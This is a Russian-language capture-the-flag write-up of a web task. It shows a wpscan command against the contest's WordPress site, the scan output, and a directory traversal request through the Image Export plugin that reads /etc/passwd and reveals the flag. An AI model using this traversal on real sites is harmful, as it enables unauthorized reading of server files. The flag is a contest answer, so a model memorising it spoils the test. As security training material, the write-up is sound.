Mr.Hacker [Web 150]
=====================
> Красивый дизайн, впечатляющие возможности и свобода создавать всё, что вы захотите.
http://185.17.120.141 (Посмотри на логин этого парня)


![alt text](https://github.com/axelmaker/vkactf2018_writeup/blob/master/web/image01.PNG?raw=true)

Переходим на сайт. Видим, что cms сайта - ```wordpress```. Так же можно узнать версию wordpress ```4.7.3```.
Если вы читаете IT новости, то наверняка видили много статьей про уязвимости wordpress, а значит нам необходим их проэкспуатировать

Используем встроенный в Kali Linux сканер wpscan (его также можно установить на любой другой дистрибутив)

Инициализируем, используя флаги ```--url``` (для указания ip адресса сайта)  ```--enumerate``` (перечисление опций ) ```vp``` (только уязвимые плагины)

```wpscan --url http://185.17.120.141/ --enumerate vp```


В результате сканирования получаем следующую информацию:

```
[+] We found 1 plugins:

[+] Name: image-export - v4.1
 |  Location: http://185.17.120.141/wp-content/plugins/image-export/
 |  Readme: http://185.17.120.141/wp-content/plugins/image-export/readme.txt

[!] Title: Image Export <= 1.1.0 - Directory Traversal
    Reference: https://wpvulndb.com/vulnerabilities/8096
    Reference: http://www.vapid.dhs.org/advisory.php?v=135
    Reference: http://packetstormsecurity.com/files/132688/

[+] Finished: Sun Jun  3 15:22:51 2018
[+] Requests Done: 1697
[+] Memory used: 78.488 MB
[+] Elapsed time: 00:00:54
```

Как мы видим, на сайте используется уязвимый плагин ```Image Export```

Гуглим, натыкаемся на сайт с описанием экспоита:

```https://ru.0day.today/exploit/23884```

![alt text](https://github.com/axelmaker/vkactf2018_writeup/blob/master/web/image02.PNG?raw=true)

Читаем описание экспоита.
Видим, что с помощью данного экспоита можно получить доступ к файла сервера.
Применим его к нашему сайту, скачав файл с данными пользователей ```/etc/passwd```

```http://185.17.120.141/wp-content/plugins/image-export/download.php?file=/etc/passwd```

Открываем файл и внизу обнаруживаем пользователя со странным никнеймом ```th1s_Is_d1r3cT0ryTR4VeRs4l```

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
nut:x:84:84:nut:/var/state/nut:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/bin/false
th1s_Is_d1r3cT0ryTR4VeRs4l:x:1000:1000:Linux User,,,:/home/th1s_Is_d1r3cT0ryTR4VeRs4l:
<br />
<b>Warning</b>:  unlink(/etc/passwd): Permission denied in <b>/var/www/html/wp-content/plugins/image-export/download.php</b> on line <b>8</b><br />
```
Легко догадаться, что данное имя пользователя и является флагом

```flag{th1s_Is_d1r3cT0ryTR4VeRs4l}```
